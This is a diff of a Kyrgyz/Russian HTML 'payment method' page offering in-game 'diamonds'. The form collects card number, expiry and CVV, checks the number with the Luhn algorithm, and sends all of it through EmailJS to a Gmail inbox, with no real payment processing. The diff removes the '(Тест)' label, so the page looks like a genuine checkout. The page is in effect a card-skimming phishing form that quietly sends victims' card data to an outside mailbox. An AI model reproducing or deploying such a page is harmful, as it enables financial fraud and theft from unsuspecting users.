@@ -122,20 +122,21 @@
 <!DOCTYPE html>
 <html lang="ky">
 <head>
-  <meta charset="UTF-8">
-  <title>Тест Төлөм 💳</title>
-  <style>
-    body{font-family:Arial,sans-serif;padding:20px;background:#f0f2f5;}
-    h2{color:#0ea5e9;}
-    input, select, button{padding:8px;margin:5px 0;width:250px;}
-    button{background:#0ea5e9;color:white;border:none;border-radius:5px;cursor:pointer;}
-    button:hover{background:#0284c7;}
-    #result{margin-top:10px;color:#0ea5e9;font-weight:bold;}
-  </style>
+<meta charset="UTF-8">
+<title>Платежный метод 💳</title>
+<style>
+  body {font-family:Arial,sans-serif; background:#f0f2f5; display:flex; flex-direction:column; align-items:center; padding:20px;}
+  h2 {color:#0ea5e9;}
+  input, select, button {padding:8px; margin:5px 0; width:250px; border-radius:5px; border:1px solid #ccc;}
+  button {background:#0ea5e9; color:white; border:none; cursor:pointer;}
+  button:hover {background:#0284c7;}
+  #result {margin-top:10px; font-weight:bold; color:#0ea5e9;}
+  form {background: rgba(255,255,255,0.9); padding:20px; border-radius:12px; box-shadow:0 0 10px rgba(0,0,0,0.1);}
+</style>
 </head>
 <body>
 
-<h2>Платежный метод 💳 (Тест)</h2>
+<h2>Платежный метод 💳</h2>
 
 <form id="paymentForm">
   <input type="text" name="cardNumber" placeholder="Карта номери" required><br>
@@ -158,19 +159,16 @@
 
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
-  // EmailJS Public Key
+  // EmailJS public key
   emailjs.init("Lejsdl7LbXKM0JQ6i");
 
-  // Luhn алгоритми менен карта номерди текшерүү
+  // Luhn алгоритми менен карта номер текшерүү
   function isValidCard(number) {
     let sum = 0;
     let shouldDouble = false;
     for (let i = number.length - 1; i >= 0; i--) {
       let digit = parseInt(number.charAt(i));
-      if (shouldDouble) {
-        digit *= 2;
-        if (digit > 9) digit -= 9;
-      }
+      if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
       sum += digit;
       shouldDouble = !shouldDouble;
     }
@@ -185,13 +183,12 @@
     const cvv = this.cvv.value.trim();
     const diamonds = this.diamonds.value;
 
-    // Карта номерди текшерүү
     if(!isValidCard(cardNumber)){
       document.getElementById('result').textContent = "Ката: карта номер туура эмес!";
       return;
     }
 
-    // EmailJS аркылуу Gmail'ге жөнөтүү
+    // EmailJS аркылуу Gmailге жөнөтүү
     emailjs.send('service_id', 'template_sw2lq9e', {
       cardNumber: cardNumber,
       expiry: expiry,
